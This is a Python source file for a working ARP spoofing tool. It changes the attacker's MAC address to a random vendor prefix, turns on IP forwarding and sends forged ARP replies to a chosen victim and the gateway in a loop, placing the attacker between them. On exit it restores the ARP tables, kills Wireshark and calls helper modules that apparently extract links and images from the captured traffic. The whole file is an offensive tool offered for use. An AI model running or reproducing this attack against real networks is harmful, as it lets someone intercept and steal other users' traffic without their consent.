#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import struct
import binascii
import time
import argparse
import os,signal
import sys
import re
import subprocess
import random
from subprocess import Popen, PIPE, check_output 


class Spoofing_arp:

      def __init__(self):

           self.arg_parse()
           self.get_geteway()
           self.mac_change()
           command = "ip -s -s neigh flush all  > output "
           subprocess.call(command,shell=True,stderr=subprocess.PIPE)  
           time.sleep(1)
           command = "ping -I "+self.args.Interface + " -w1 127.0.0.1 > output  "           
           subprocess.call(command,shell=True,stderr=subprocess.PIPE)  
           os.remove("output") 
           time.sleep(1)          
           
           self.Host_info()
           self.arpSpoofing()
      
      def get_geteway(self):
          
           with open ('/proc/net/arp','r') as geteway :
                self.router= geteway.readlines()
           for line in self.router :
               if self.args.Interface in line :
                  self.rou_split = str("".join(line)).replace("\n",'').split()
           self.getaddrss = self.rou_split[0]
           self.getmac = self.rou_split[3]
           route_ipbytes = bytes(self.getaddrss.encode('utf-8'))
           self.geteway_mac = binascii.unhexlify(self.getmac.replace(":",''))
           self.RouterIpConvert = socket.inet_aton(str(route_ipbytes).replace("'","").replace('b',""))  

      def mac_change(self):

          mac_list =  ['FC:0F:E6:','00:12:EE:','00:1E:DC:','78:84:3C:',
                       '00:26:B9:','14:FE:B5:','BC:30:5B:','D0:67:E5:',
                       '10:1D:C0:','78:25:AD:','A0:0B:BA:','E8:11:32:',
                       'F8:1E:DF:','E0:F8:47:','A4:B1:97:','7C:6D:62:',
                       '00:0A:F3:','00:0C:86:','B4:A4:E3:','FC:FB:FB:',
                      ] 
                              
          Mac_list= random.choice(mac_list)                  
          Mac_Cook  ="".join( f'{random.randrange(16**8):x}')
          Mac_Host = ':'.join(Mac_Cook[i:i+2] for i in range(0,6,2)).upper()
          self.Mac_addr =  Mac_list + Mac_Host  
          command  = "ifconfig  "+self.args.Interface + " | grep ether"
          Current_Mac_P = subprocess.check_output (command,shell=True).decode('utf-8')
          Current_Mac_C = re.compile(r'(?:[0-9a-fA-F]:?){12}')
          Current_Mac_F = re.findall(Current_Mac_C , Current_Mac_P)
          self.Current_Mac_G = str("".join(Current_Mac_F[0]))
          ifconfig_down = "sudo ifconfig "+self.args.Interface+" down"
          ifconfig_mac_change = "sudo ifconfig "+self.args.Interface+ " hw ether "+self.Mac_addr
          ifconfig_up = "sudo ifconfig "+self.args.Interface+" up"
          os.system(ifconfig_down)
          config  = os.system(ifconfig_mac_change)
          os.system(ifconfig_up) 
          if   Mac_list in str("".join(mac_list[0:4]))  :
               self.vendor_chanage = 'Sony'
          elif Mac_list in   str("".join(mac_list[4:8])) :
                self.vendor_chanage = 'Dell'
          elif Mac_list in str("".join(mac_list[8:12]))  :
                self.vendor_chanage = 'Samsung'
          elif Mac_list in str("".join(mac_list[12:16])) :
                self.vendor_chanage = 'Apple'     
          elif Mac_list in str("".join(mac_list[16:20])) :
                self.vendor_chanage = 'Cisco'  
                    
      def Host_info(self):

           command  = "ifconfig "+self.args.Interface+" | grep 'ether'"
           Macdb = subprocess.check_output (command,shell=True).decode('utf-8')
           Macaddr = re.compile(r'(?:[0-9a-fA-F]:?){12}')
           FMac = re.findall(Macaddr ,Macdb)
           self.Mac_Interface = str("".join(FMac[0]))
           self.source_mac = binascii.unhexlify(self.Mac_Interface.replace(":",''))
           self.host_name  = socket.gethostname() 
           host_ip    = "ifconfig  "+self.args.Interface+" | egrep '([0-9]{1,3}\.){3}[0-9]{1,3}'"
           ip_process = str(subprocess.check_output (host_ip,shell=True)).split()
           self.host_ip =  ip_process
           self.host_ip =str( self.host_ip [2])
           self.HostIpBytes = socket.inet_aton(str(self.host_ip).replace("'","").replace('b',""))  
  
      def arpSpoofing(self):               
          try:
              os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
              SocketConnect = socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.htons(0x0806))
              SocketConnect.bind((self.args.Interface,0x0806))                  
              SocketConnect.settimeout(10)
              source_ip  = self.HostIpBytes
              dest_ip    = bytes(self.args.Target.encode('utf-8'))
              source_mac = self.source_mac
              dest_mac   = binascii.unhexlify(self.args.dest.replace(":",''))
              protocol   = 0x0806
              eth_hdr    = struct.pack("!6s6sH",dest_mac,self.source_mac,protocol)
              eth_hdr2    = struct.pack("!6s6sH",self.geteway_mac,self.source_mac,protocol)
              
              # victimmac + attckmac + code
              # gatewaymac +  attckmac + code

              htype      = 1
              ptype      = 0x0800
              hlen       = 6
              plen       = 4 
              opcode_1   = 1
              opcode_2   = 2

              src_ip  = self.HostIpBytes
              des_ip  = socket.inet_aton(str(dest_ip).replace("'","").replace('b',""))

              arp_target = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hlen,plen,opcode_2,self.source_mac,self.RouterIpConvert,dest_mac,des_ip)
              arp_router = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hlen,plen,opcode_2,self.source_mac,des_ip,self.geteway_mac, self.RouterIpConvert)
              #arp_target : htype + protype + hsize + psize + opcode + attckmac + gatewayip + victimmac + victimip
              #arp_router : htype + protype + hsize + psize +opcode + attckmac + victimip + gatewaymac + gatewayip  
              Packet_target = eth_hdr +arp_target 
              Packet_router = eth_hdr2 +arp_router
              time.sleep(1)
              print("\n[*] arp_attack Start...."+"\n"+"*"*20)
              print("[*] arp table has be delete successful")
              time.sleep(2)
              print("[*] New arp table has be created successful")
              time.sleep(1)
              print("[*] IP Forward set to  value 1")
              print("\n[*] Mac_Change Info:\n"+'*'*22)
              print("[*] Current Mac   -----------------|-> " + str(self.Current_Mac_G))
              time.sleep(0.30)
              print("[*] New Mac       -----------------|-> " + str(self.Mac_addr))
              print("[*] vendor Mac    -----------------|-> " + str(self.vendor_chanage))
              print('\n'+"*"*22)
              print("[*] Attck Status\n"+'*'*22)
              time.sleep(0.30)
              print("[*] Victam-Ip     -----------------|-> " + self.args.Target)
              time.sleep(0.30)
              print("[*] Victam-Mac    -----------------|-> " + self.args.dest)
              time.sleep(0.30)
              print("[*] Attacker-Ip   -----------------|-> " + self.host_ip)
              time.sleep(0.30)
              print("[*] Attacker-Mac  -----------------|-> " + self.Mac_Interface)
              time.sleep(0.30)
              print("[*] Geteway-Ip    -----------------|-> " + self.getaddrss)
              time.sleep(0.30)
              print("[*] Geteway-Mac   -----------------|-> " + self.getmac )
              time.sleep(0.30)
              print("[*] Interface     -----------------|-> " + self.args.Interface )
              print("*"*40+'\n')
 
              sys.stdout.write('\x1b[1A')
              sys.stdout.write('\x1b[2K')
              count = 1
              while True :
                   print ("[*] arp Packet Send  >> ",count)
                   sys.stdout.write('\x1b[1A')
                   sys.stdout.write('\x1b[2K')
                   send_packet_to_Target   = SocketConnect.send(Packet_target)    
                   send_packet_to_router   = SocketConnect.send(Packet_router) 
                   
                   if not self.args.repate:
                         time.sleep(2)
                   elif self.args.repate :
                       time.sleep(int(self.args.repate))
                   count +=1
          except Exception as Error :
              print('\n'+"*"*22)
              print("[*] Attck Status\n"+'*'*22)
              time.sleep(0.30)
              print("[*] Error   -----------------|-> " + str(Error))
              exit()
          except KeyboardInterrupt :
                    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                    eth_hdr_Fix   = struct.pack("!6s6sH",dest_mac,self.source_mac,protocol)
                    eth_hdr2_Fix  = struct.pack("!6s6sH",self.geteway_mac,self.source_mac,protocol)
                    arp_target    = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hlen,plen,opcode_2,self.geteway_mac,self.RouterIpConvert,dest_mac,des_ip)
                    arp_router    = struct.pack("!HHBBH6s4s6s4s",htype,ptype,hlen,plen,opcode_2,dest_mac,des_ip,self.geteway_mac,self.RouterIpConvert)
                    Packet_target = eth_hdr_Fix +arp_target 
                    Packet_router = eth_hdr2_Fix +arp_router
                    send_packet_to_Target   = SocketConnect.send(Packet_target)    
                    send_packet_to_router   = SocketConnect.send(Packet_router)    
                    print("\rHosueKeeping Cleanup Process ......")
                    print("*"*40)
                    time.sleep(0.30)
                    print("[*] Total Packet send is ....|- "+ str(count))
                    time.sleep(1)
                    print("[*] IP Forward set to default value 0")
                    time.sleep(1)
                    def mac_return():
                        ifconfig_down = "sudo ifconfig "+self.args.Interface+" down"
                        ifconfig_mac_change = "sudo ifconfig "+self.args.Interface+ " hw ether "+self.Current_Mac_G 
                        ifconfig_up = "sudo ifconfig "+self.args.Interface+" up"
                        os.system(ifconfig_down)
                        os.system(ifconfig_mac_change)
                        os.system(ifconfig_up)                        
                    mac_return()
                    time.sleep(0.30)
                    print("[*] arp Table set to Normal ...")
                    time.sleep(1)
                    print ("[*] Real Mac Set : "+self.Current_Mac_G)
                    for ID_Number in os.popen("ps ax | grep wireshark | grep -v grep"):   
                        if "wireshark" in  ID_Number :                 
                            ProcessID = ID_Number.split()
                            ProcessID = ProcessID[0]
                            os.kill(int(ProcessID), signal.SIGKILL)
                    print("[*] closing wireshark ...")
                    time.sleep(0.30)
                    print("[*] PCAPNG Packet Capture saved at  Capture folder ...")
                    counted = 6 
                    from Links import Gerp_Links
                    run = Gerp_Links()
                    try:        
                       from image import ImagesDownLoad
                       run = ImagesDownLoad()
                       user = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
                       group = "chown "+ user+ ":"+user +" *"
                       os.system(group)
                    except Exception  as e : 
                      print ("[+] Error With Images Capture ....!" ,e)  
                        
                    for i in range(int(counted)) :
                        counted -=1
                        print("[*] Exit attack Start DownCount >> "+str(counted))
                        time.sleep(1)
                        sys.stdout.write('\x1b[1A')
                        sys.stdout.write('\x1b[2K')
                    print("[*] Exit safe......")
                    time.sleep(1)
                    exit()
      def arg_parse(self):
          parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")          
          parser.add_argument( '-I',"--Interface")
          parser.add_argument( '-M',"--dest"     )  
          parser.add_argument( '-T',"--Target"   )
          parser.add_argument( '-R',"--repate"   )
          parser.add_argument( '-W',"--Wireshark",action='store_true')
          self.args = parser.parse_args()
          if len(sys.argv)> 1 :
              pass
          else:
              parser.print_help()
              exit()  
if __name__=='__main__':
     Spoofing_arp()
